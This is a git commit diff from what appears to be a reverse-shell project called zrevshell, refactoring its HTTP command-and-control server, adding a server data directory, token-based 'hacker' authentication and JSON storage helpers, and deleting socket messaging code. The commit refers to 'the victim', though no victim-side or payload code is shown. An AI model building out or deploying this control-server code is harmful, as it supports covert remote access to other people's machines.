aa9f7c395f8ee0881080509a8d965800cf2c99b4
Bezaleel Wondimagegn <92359779+bython17@users.noreply.github.com>
2023-01-18 13:32:49 +0300

    Added CLI to the victim and refactoring
    Refactor code (includes deleting unnecessary code and unused code)
    and made a base directory where the server can store it files in and
    ignored it in .gitignore. Removed and deleted the consts.py file

--- reverse_shell/server/server.py
+++ reverse_shell/server/server.py
@@ -14,10 +14,14 @@ import sys
 
 
 class ZrevshellServer(BaseHTTPRequestHandler):
-    def __init__(self, auth_token: str, hacker_token: str,  *args, **kwargs):
+    def __init__(self, auth_token: str, hacker_token: str, base_dir: Path,  *args, **kwargs):
         # auth_token is a base64 message i.e it is a string that has been decoded from a base64 byte using ascii.
         self.auth_token = auth_token
         self.hacker_token = hacker_token
+        self.base_dir = base_dir
+
+        # Create the base directory if it doesn't exist.
+        self.base_dir.mkdir(parents=True, exist_ok=True)
 
         super().__init__(*args, **kwargs)
 
@@ -43,21 +47,20 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         if self.is_authenticated():
             if self.headers.get("content-type") == "application/json":
                 if self.path != "/":
-                    file_path = f".{self.path}.json"
+                    file_path = self.base_dir / f"{self.path[1:]}.json"
                 else:
                     self.send_error(HTTPStatus.BAD_REQUEST)
                     self.end_headers()
                     return
-                with open(file_path) as file:
-                    data = json.loads(file.read())
-                    client_id = self.headers.get("client-id")
-                    content_size = int(self.headers.get("content-length"))
-                    # Create or modify the data
-                    data[client_id] = json.loads(self.rfile.read(content_size))
+
+                data = ut.read_json(file_path)
+                client_id = self.headers.get("client-id")
+                content_size = int(self.headers.get("content-length"))
+                # Create or modify the data
+                data[client_id] = json.loads(self.rfile.read(content_size))
 
                 # Write the data back to the file
-                with open(file_path, "w") as file:
-                    file.write(json.dumps(data))
+                ut.write_json(file_path, data)
 
                 # If the data exists then send the 200 status code but if it doesn't exist
                 # then send the 201 status code
@@ -71,8 +74,6 @@ class ZrevshellServer(BaseHTTPRequestHandler):
                 self.send_error(HTTPStatus.UNSUPPORTED_MEDIA_TYPE)
                 self.end_headers()
 
-# hacker_token + auth_token
-
 
 def generate_token():
     random_uuid = uuid.uuid4()
@@ -81,22 +82,17 @@ def generate_token():
     return base64_encoded_bytes.decode('ascii')
 
 
-# def decode_token(token: str):
-#     ascii_encoded_base64 = token.encode("ascii")
-#     decoded_ascii = base64.b64decode(ascii_encoded_base64)
-#     return decoded_ascii.decode("ascii")
-
-def create_log_file(auth_token, hacker_token):
+def create_log_file(auth_token, hacker_token, base_dir: Path):
     current_time = str(datetime.now())
     current_time = current_time.replace(":", "-")
     current_time = current_time.replace(" ", "-")
     current_time = current_time.split(".")[0]
 
     # Create the path and stuff
-    directory = Path("./logs/")
-    directory.mkdir(parents=True, exist_ok=True)
+    log_dir = base_dir / Path("./logs")
+    log_dir.mkdir(parents=True, exist_ok=True)
 
-    file_path = directory / f"{current_time}.json"
+    file_path = log_dir / f"{current_time}.json"
 
     with file_path.open("w") as log_file:
         data = {"auth_token": auth_token, "hacker_token": hacker_token}
@@ -104,27 +100,31 @@ def create_log_file(auth_token, hacker_token):
 
 
 def get_config():
-    argument_parser = argparse.ArgumentParser(prog=f"{__app_name__} server", description="The server for the zrevshell project", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+    parser = argparse.ArgumentParser(prog=f"{__app_name__} server",
+                                     description=f"The server for the {__app_name__} project", formatter_class=argparse.ArgumentDefaultsHelpFormatter
+                                     )
 
-    argument_parser.add_argument("--from-log", type=Path, required=False, help="Server generated log file used to re-initiate the same session as the previous.", default=None)
+    parser.add_argument("--from-log", type=Path, required=False, help="Server generated log file used to re-initiate the same session as the previous.", default=None)
 
-    argument_parser.add_argument("-p", "--port", type=int, required=False, help="The port on which the server runs on.", default=80)
+    parser.add_argument("--server-dir", "-sd", type=Path, required=False, help="Directory where the server will store it's data like logs and etc...", default=Path("server_data"))
 
-    argument_parser.add_argument("-i", "--ip", type=str, required=False, help="The ip where the server is hosted on.", default="0.0.0.0")
+    parser.add_argument("-p", "--port", type=int, required=False, help="The port on which the server runs on.", default=80)
 
-    argument_parser.add_argument("--version", "-v", action="version", version=f"{__app_name__} server v{__version__}")
+    parser.add_argument("-i", "--ip", type=str, required=False, help="The ip where the server is hosted on.", default="0.0.0.0")
 
-    return argument_parser.parse_args()
+    parser.add_argument("--version", "-v", action="version", version=f"{__app_name__} server v{__version__}")
+
+    return parser.parse_args()
 
 
-def initialize_server(auth_token: str, hacker_token: str, host: str, port: int, should_create_log_file=True):
+def initialize_server(auth_token: str, hacker_token: str, host: str, port: int, base_dir: Path, should_create_log_file=True):
     # auth_token is a base64 message i.e it is a string that has been decoded from a base64 byte using ascii.
 
     # Create a log file with the hacker and auth token
     if should_create_log_file:
-        create_log_file(auth_token, hacker_token)
+        create_log_file(auth_token, hacker_token, base_dir)
 
-    handler = partial(ZrevshellServer, auth_token)
+    handler = partial(ZrevshellServer, auth_token, hacker_token, base_dir)
 
     ut.log("info", f"Server is running on {host} port {port}...")
     server = HTTPServer((host, port), handler)
@@ -142,10 +142,9 @@ def main():
     config = get_config()
     # Extract the auth_token and hacker_token from file
     # if the file exists else generate them
-    if (path := config.from_log) is not None:
-        file_path = Path(path)
+    if (file_path := config.from_log) is not None:
         if not file_path.is_file():
-            ut.log("error", f"The file `{path}` doesn't exist!")
+            ut.log("error", f"The file `{file_path}` doesn't exist!")
             sys.exit(ErrorCodes.file_not_found)
 
         contents = file_path.read_text("utf-8")
@@ -163,7 +162,8 @@ def main():
         hacker_token = generate_token()
         should_create_log_file = True
 
-    initialize_server(auth_token, hacker_token, config.ip, config.port, should_create_log_file=should_create_log_file)
+    initialize_server(auth_token, hacker_token, config.ip, config.port, config.server_dir, should_create_log_file=should_create_log_file)
 
 
-main()
+if __name__ == "__main__":
+    main()
--- reverse_shell/utils.py
+++ reverse_shell/utils.py
@@ -1,51 +1,16 @@
-import socket
-import reverse_shell.consts as ct
+from pathlib import Path
+import json
 
 
 def log(focus_message: str, description):
     print(f"[{focus_message.upper()}] {description}")
 
 
-def send_message(message: str, sock: socket.socket):
-    message_length = len(message)  # this is the length of the message we are going to send
-    # Now we need to add white spaces to the message_length in order to make it fit to the HEADER_SIZE
-    message_length = f"{message_length:<{ct.HEADER_SIZE}}"  # here what i did was just adding white spaces to the message_length.
-    sock.send(message_length.encode(ct.ENCODING))  # then send that to the server or client
-
-    # Now let's send the actual message which is simple
-    sock.send(message.encode(ct.ENCODING))
+def write_json(file_path: Path, data: dict):
+    file_path.write_text(json.dumps(data))
 
 
-def receive_message(sock: socket.socket):
-    message_length = sock.recv(ct.HEADER_SIZE).decode(ct.ENCODING)
-
-    if not message_length:
-        return None
-
-    message_length = int(message_length)
-
-    if message_length <= 16:
-        return sock.recv(message_length).decode(ct.ENCODING)
-
-    full_message = ""
-
-    ################ Nython's Logic##########################
-    # while message_length > 16:
-    #     message_part = sock.recv(16).decode(ct.ENCODING)
-    #     full_message += message_part
-    #     message_length -= 16
-
-    # if message_length:
-    #     full_message += sock.recv(message_length).decode(ct.ENCODING)
-    #######################################################
-
-    ############### Bython's Logic##########################
-    receive_sizes = [16] * (message_length // 16)
-    receive_sizes.append(message_length % 16)
-
-    for receive_size in receive_sizes:
-        part_message = sock.recv(receive_size).decode(ct.ENCODING)
-        full_message += part_message
-    #####################################################
-
-    return full_message
+def read_json(file_path: Path):
+    if not file_path.is_file():
+        file_path.write_text("{}")
+    return json.loads(file_path.read_text())
